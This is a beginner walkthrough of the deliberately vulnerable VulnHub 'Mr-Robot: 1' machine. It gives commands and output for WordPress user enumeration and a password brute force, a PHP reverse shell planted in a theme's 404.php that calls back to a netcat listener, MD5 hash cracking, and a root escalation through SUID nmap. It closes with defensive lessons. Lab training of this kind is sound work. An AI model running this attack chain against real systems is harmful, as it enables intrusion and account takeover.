# Mr-Robot: 1 — VulnHub Walkthrough (Beginner Friendly)

> Educational walkthrough for students. This machine is **deliberately vulnerable** and must only ever be run on an isolated, host-only network (e.g. VirtualBox Host-Only or a private lab VLAN). Never expose it to the internet.

| Field | Value |
| --- | --- |
| **Machine** | Mr-Robot: 1 |
| **Author** | Leon Johnson |
| **Released** | 28 Jun 2016 |
| **Difficulty** | Easy (beginner–intermediate) |
| **Attacker** | Kali Linux |
| **Target** | Linux (Ubuntu 14.04, WordPress on Apache) |
| **Keys/Flags** | 3 |
| **Example Target IP** | `192.168.56.101` |
| **VulnHub Entry** | [Open on VulnHub](https://vulnhub.com/entry/mr-robot-1,151/) |
| **Download** | [Download OVA](https://vulnhub.com/entry/mr-robot-1,151/#download) |

Throughout this walkthrough the target is always `192.168.56.101` and the attacker (Kali) is `192.168.56.100`. Substitute your own values.

---

## 0. What you will learn

By the end of this lab you will have practiced the full beginner kill-chain:

- **Host discovery** — finding the target's IP on your lab network (`ip a`, `arp-scan`/`netdiscover`, `nmap -sn`).
- **Port & service enumeration** — full TCP scan with `nmap -sC -sV -p-`.
- **Web enumeration** — reading `robots.txt`, spotting an information leak.
- **WordPress enumeration** — using `wpscan` to find a valid username.
- **Credential attacks** — a targeted dictionary/brute-force attack against `wp-login.php`.
- **Foothold via a legitimate admin feature** — abusing the WordPress Theme Editor to run a PHP reverse shell.
- **Post-exploitation** — finding a password hash, cracking it with John the Ripper, and pivoting users with `su`.
- **Linux privilege escalation** — discovering a SUID `nmap` binary and abusing its interactive mode (via GTFOBins) to become root.

> **Why this matters:** every step here maps to a real-world attack technique. The box is a teaching tool, but the *patterns* — leaked wordlists, verbose login errors, editable server-side templates, misconfigured SUID binaries — appear in production systems constantly.

---

## 1. Reconnaissance — finding the target

First, confirm your own network interface and IP address.

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 ...
    inet 192.168.56.100/24 brd 192.168.56.255 scope global eth0
```

> **Why it works:** `ip a` lists your network interfaces and their IP addresses. You need to know your subnet (here `192.168.56.0/24`) so you can scan the right range for the target.

Now sweep the subnet to find live hosts. Two common tools:

```bash
sudo arp-scan --localnet
```

```text
192.168.56.100   08:00:27:aa:bb:cc   PCS Systemtechnik GmbH
192.168.56.101   08:00:27:dd:ee:ff   PCS Systemtechnik GmbH
```

```bash
sudo netdiscover -r 192.168.56.0/24
```

```text
 192.168.56.100   1    08:00:27:aa:bb:cc   1   100  Kali Linux
 192.168.56.101   1    08:00:27:dd:ee:ff   1   105  (unknown)
```

Alternatively, an nmap ping sweep (no port scan) is quieter and works well:

```bash
sudo nmap -sn 192.168.56.0/24
```

```text
Nmap scan report for 192.168.56.101
Host is up (0.00042s latency).
```

> **Why it works:** The target answers ARP (same layer-2 network) or ICMP echo requests, confirming it is alive. `-sn` disables port scanning so the sweep is fast. `PCS Systemtechnik GmbH` / the `08:00:27` prefix is VirtualBox's default MAC vendor, a strong hint the host is a VM.

Target confirmed: **192.168.56.101**.

![Host discovery output](images/01-host-discovery.png)

---

## 2. Enumeration

Now scan all TCP ports, run default scripts, and fingerprint service versions.

```bash
sudo nmap -sC -sV -p- 192.168.56.101
```

```text
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 192.168.56.101
Host is up (0.00060s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu (protocol 2.0)
80/tcp  open  http     Apache httpd
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache
443/tcp open  ssl/http Apache httpd
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
```

| Flag | Meaning |
| --- | --- |
| `-sC` | Run the default set of Nmap NSE scripts. |
| `-sV` | Probe open ports to detect service & version. |
| `-p-` | Scan **all 65,535** TCP ports, not just the top 1000. |

> **Why it works:** Three services stand out — SSH (22), HTTP (80), and HTTPS (443). The web server runs Apache and the certificate names `www.example.com`, so this is clearly a web-facing target. Web servers are where beginners usually find the first foothold.

Open the site in a browser at `http://192.168.56.101`. You are greeted by a Mr. Robot themed fake IRC terminal. It is a dead end, but it confirms a web app is running. Digging into directories eventually points at WordPress — but the fastest lead is the very first file any web enumerator should check: **robots.txt**.

```bash
curl http://192.168.56.101/robots.txt
```

```text
User-agent: *
fsocity.dic
key-1-of-3.txt
```

> **What is `robots.txt`?** It is a plain-text file placed at the root of a website to tell search-engine crawlers which paths they are *not* supposed to index. It is a polite convention, **not a security control**. Because it is publicly readable, anything listed in it is effectively published to the world. Here the admin put two private filenames in it — a classic information leak.

> **Huge red flag:** `fsocity.dic` looks like a *dictionary/wordlist*, and `key-1-of-3.txt` is obviously a flag. A site leaking its own password wordlist is an attacker's dream — it removes all the guesswork from a brute-force attack.

Download the first key:

```bash
curl http://192.168.56.101/key-1-of-3.txt
```

```text
073403c8a58a1f80d943455fb30724b9
```

**Key 1: `073403c8a58a1f80d943455fb30724b9`**

Grab a copy of the leaked wordlist for later:

```bash
wget http://192.168.56.101/fsocity.dic
wc -l fsocity.dic
```

```text
 858160 fsocity.dic
```

![robots.txt and key 1](images/02-robots-txt.png)

---

## 3. Web enumeration & WordPress

The `readme.html` and login pages found during directory brute-forcing confirm **WordPress**. Enumerate users with `wpscan`.

```bash
wpscan --url http://192.168.56.101 -e u
```

```text
[+] URL: http://192.168.56.101/ [192.168.56.101]
[+] WordPress version 4.3.6 identified
[+] Enumerating Users (via Passive and Aggressive Methods)
[i] User(s) Identified:
[+] elliot
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
```

> **Why it works:** WordPress publishes author information (used by `/?author=1` URLs and REST endpoints), and `wpscan`'s `-e u` flag turns that into a user list. Result: a valid username, **`elliot`** — the show's protagonist, and the `fsocity.dic` wordlist almost certainly contains it too.

> **Bonus lead:** the `/license` page (found by `nikto`/`gobuster`) contains a base64 blob at the bottom. Decoding is a nice shortcut to the same credentials:
>
> ```bash
> echo ZWxsaW90OkVSMjgtMDY1Mgo= | base64 -d
> ```

Now deduplicate the leaked wordlist — it contains only ~11k unique entries out of 858k lines — and brute-force `wp-login.php`.

```bash
sort -u fsocity.dic > fsocity-clean.dic
wc -l fsocity-clean.dic
```

```text
 11451 fsocity-clean.dic
```

```bash
wpscan --url http://192.168.56.101 \
  --password-attack wp-login \
  -U elliot \
  -P fsocity-clean.dic
```

```text
[+] Performing password attack on Wp Login against 1 user/s
[SUCCESS] - elliot / ER28-0652
[+] Valid Combinations Found:
 | Username: elliot, Password: ER28-0652
```

> **Why it works:** WordPress returns *different error messages* for an invalid username versus an invalid password. That turns a login form into a username oracle. Once the username is known, a dictionary attack against the password field (using the server's own leaked wordlist!) recovers `elliot : ER28-0652`.

> **Real-world note:** this attack was only this fast because the target leaked a tailored wordlist. On a well-configured site, `wpscan` would need rate limiting, lockouts, and CAPTCHA to defeat — but the same enumeration principle applies.

![wpscan user enum and brute force](images/03-wpscan.png)

---

## 4. Foothold

Log in to the WordPress dashboard with the recovered credentials:

- URL: `http://192.168.56.101/wp-login.php`
- Username: `elliot`
- Password: `ER28-0652`

`elliot` has **Administrator** rights. Administrators can edit theme template files directly from the browser, which means we can make the server execute our PHP.

1. Get a copy of the well-known pentestmonkey reverse shell:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php .
```

2. Open it and set your Kali IP and listening port near the top:

```php
$ip   = '192.168.56.100'; // CHANGE THIS
$port = 4444;             // CHANGE THIS
```

3. In the dashboard go to **Appearance → Theme Editor**, and select **`404.php`** (the "404 Template") from the active theme (Twenty Fifteen). Replace its entire contents with the reverse-shell code and click **Update File**.

> **Why it works:** the Theme Editor is a legitimate feature that lets admins edit PHP templates. A PHP template is executed server-side, so any code we put here runs on the target as the web-server user. Hiding it in `404.php` means our code fires whenever a page is *not found*.

4. Start a listener on Kali **before** triggering the shell:

```bash
nc -lvnp 4444
```

5. Trigger the shell by requesting a page that does not exist (which loads `404.php`):

```bash
curl "http://192.168.56.101/definitely-does-not-exist"
```

```text
connect to [192.168.56.100] from (UNKNOWN) [192.168.56.101] 40218
Linux linux 3.13.0-55-generic #94-Ubuntu SMP ... x86_64 GNU/Linux
uid=1(daemon) gid=1(daemon) groups=1(daemon)
$
```

We have a shell as **`daemon`**. Upgrade it to a proper interactive TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

> **Why it works:** the raw netcat shell has no job control, no tab completion, and often cannot handle interactive prompts like `su`. Spawning a pseudo-terminal (`pty`) fixes all of that — you will need it for the `su` step below.

Now enumerate the home directory:

```bash
cd /home/robot
ls -la
```

```text
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
```

We cannot read `key-2-of-3.txt` as `daemon`, but `password.raw-md5` is world-readable:

```bash
cat password.raw-md5
```

```text
robot:c3fcd3d76192e4007dfb496cca67e13b
```

Crack the MD5 hash with John the Ripper (it is a very weak, well-known password):

```bash
echo 'robot:c3fcd3d76192e4007dfb496cca67e13b' > robot.hash
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt robot.hash
```

```text
c3fcd3d76192e4007dfb496cca67e13b (robot)
```

```text
abcdefghijklmnopqrstuvwxyz
```

> **Why it works:** MD5 is a fast, unsalted hashing algorithm. There is no key-stretching, so billions of guesses per second are possible, and `rockyou.txt` contains this password (the entire lowercase alphabet). Never store passwords with unsalted MD5.

Pivot to the `robot` user and read Key 2:

```bash
su robot
# password: abcdefghijklmnopqrstuvwxyz
cat /home/robot/key-2-of-3.txt
```

```text
822c73956184f694993bede3eb39f959
```

**Key 2: `822c73956184f694993bede3eb39f959`**

![Reverse shell and key 2](images/04-foothold.png)

---

## 5. Privilege escalation

We need root for the final key. The classic first move is to hunt for SUID binaries.

```bash
find / -perm -4000 -type f 2>/dev/null
```

```text
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/bin/ping
/bin/umount
/bin/mount
/usr/local/bin/nmap
```

> **What is SUID?** The SUID bit (`-rwsr-xr-x`, note the `s`) makes a program run with the privileges of its **owner** instead of the user who launched it. Most listed binaries are owned by `root`. Normally that is intentional and safe (`passwd` needs root to change passwords). But `nmap` — a network scanner — has **no business** being SUID root. That is the misconfiguration.

Check the version and confirmed SUID owner:

```bash
ls -l /usr/local/bin/nmap
/usr/local/bin/nmap --version
```

```text
-rwsr-xr-x 1 root root 504736 Nov 13  2015 /usr/local/bin/nmap
Nmap version 3.81 ( http://www.insecure.org/nmap/ )
```

> **Why it works:** nmap **3.81** still supports `--interactive` mode, which drops into a mini-shell that can run commands on the OS — and because the binary is SUID root, those commands run as root. This exact technique is documented on [GTFOBins](https://gtfobins.github.io/gtfobins/nmap/).

Exploit it:

```bash
nmap --interactive
```

```text
Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
```

```bash
whoami
id
```

```text
root
uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
```

> **Why it works:** `!sh` in nmap's interactive mode spawns a shell. Because nmap is SUID root, the shell inherits `euid=0` — effective root. We now have full control.

Read the final key:

```bash
cat /root/key-3-of-3.txt
```

```text
04787ddef27c3dee1ee161b21670b4e4
```

**Key 3: `04787ddef27c3dee1ee161b21670b4e4`**

![Root shell and key 3](images/05-privesc-root.png)

All three keys captured. Machine rooted.

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Sensitive file disclosure via `robots.txt` | `http://<IP>/robots.txt` | Leaks `fsocity.dic` (wordlist) and Key 1 |
| 2 | Username enumeration via verbose login errors | `wp-login.php` | Reveals valid user `elliot` |
| 3 | Weak / guessable admin credentials | WordPress admin | Full CMS admin access |
| 4 | Server-side code execution via Theme Editor | Appearance → Editor → `404.php` | Remote shell as `daemon` |
| 5 | Weak unsalted MD5 password storage | `/home/robot/password.raw-md5` | `robot` password cracked instantly |
| 6 | SUID root binary with shell escape | `/usr/local/bin/nmap` (v3.81) | Full root compromise |

---

## 6. Defensive lessons

- **Do not put sensitive paths in `robots.txt`.** It is public. Use authentication, not obscurity, to protect files.
- **Return generic login errors.** Never tell an attacker whether a username exists — "Invalid username or password" for every failure kills username enumeration.
- **Enforce strong admin credentials and rate limiting / lockouts / MFA** on `wp-login.php`, and disable XML-RPC if unused.
- **Restrict the WordPress theme/plugin editor** by setting `define('DISALLOW_FILE_EDIT', true);` in `wp-config.php`, and enforce the principle of least privilege for web users.
- **Store passwords with a slow, salted hash** (bcrypt, scrypt, Argon2) — never unsalted MD5/SHA1.
- **Audit SUID binaries.** `find / -perm -4000 -type f` regularly; remove the SUID bit from anything that does not strictly need it (nmap certainly does not).
- **Keep software patched** — old nmap, old WordPress, and old plugins all contributed here.
- **Segment and isolate lab machines.** This box must never touch a production or internet-facing network.
- **Log and alert** on brute-force attempts, repeated 404s to PHP files, and unusual child processes spawned by privileged binaries.

---

## 7. References

- Mr-Robot: 1 on VulnHub — https://vulnhub.com/entry/mr-robot-1,151/
- Jack Halon — "VulnHub 'Mr.Robot 1' - CTF" — https://jhalon.github.io/vulnhub-mr-robot1/
- Syrion (Raffaele Sabato) — "Mr-Robot: 1 Writeup" — https://syrion.me/mr-robot-1-writeup/
- w1zard — "Mr-Robot: 1" — https://w1zard.com/posts/robot-1/
- ziomsec (Moiz Bootwala) — "Mr Robot - VulnHub Writeup" — https://ziomsec.com/writeups/vulnhub/mr-robot/
- imflikk — "VulnHub – Mr. Robot 1" — https://flikk.blog/2019/11/10/vulnhub-mr-robot-1/
- Bradley Thornton — "Mr-Robot 1 Walkthrough" — https://thor-sec.com/walkthroughs/mrrobot1/
- GTFOBins — nmap — https://gtfobins.github.io/gtfobins/nmap/
- pentestmonkey PHP reverse shell — https://github.com/pentestmonkey/php-reverse-shell

---

## 8. Screenshot checklist

When you reproduce this lab, capture and save the following images to `images/`:

- [ ] `01-host-discovery.png` — `ip a` / `arp-scan` / `nmap -sn` showing the target IP.
- [ ] `02-robots-txt.png` — `robots.txt` output and Key 1.
- [ ] `03-wpscan.png` — wpscan user enumeration and the successful `elliot : ER28-0652` brute force.
- [ ] `04-foothold.png` — Theme Editor edit, netcat shell, and Key 2 (`password.raw-md5` + cracked hash).
- [ ] `05-privesc-root.png` — SUID nmap, `nmap --interactive` → `!sh`, root `id`, and Key 3.
- [ ] `06-keys-recap.png` — all three keys side by side for the final report.

---

_Full exploitation chain: `robots.txt` leak (`fsocity.dic` + Key 1) → `wpscan` user enum → `wp-login` brute force with the leaked wordlist (`elliot:ER28-0652`) → edit theme `404.php` with a pentestmonkey PHP reverse shell → shell as `daemon` → crack `robot` MD5 (`abc...xyz`) → `su robot` (Key 2) → SUID `/usr/local/bin/nmap` interactive `!sh` → root (Key 3)._

_Part of the [Cybersecurity101-Labs](../../README.md) collection. See the complete [catalog](../../docs/CATALOG.md)._
